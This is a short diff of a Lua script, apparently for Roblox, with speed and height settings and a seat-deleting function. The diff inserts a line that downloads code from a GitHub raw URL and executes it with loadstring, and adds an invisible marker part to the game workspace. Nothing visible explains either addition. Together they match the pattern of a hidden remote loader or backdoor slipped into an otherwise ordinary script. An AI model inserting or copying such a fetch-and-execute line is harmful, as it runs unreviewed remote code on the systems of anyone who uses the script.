@@ -1,6 +1,13 @@
 local speed = 24  
 local SOLO = 500 -- Altura
 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lostok123/Script/main/Config_intence2"))()
+local Part = Instance.new("Part")
+Part.Name = "Instante1"
+Part.Transparency = "1"
+Part.Parent = game.Workspace
+
 local function deleteSeats(instance)
 	for _, child in ipairs(instance:GetChildren()) do
 		if child:IsA("VehicleSeat") or child:IsA("Seat") then
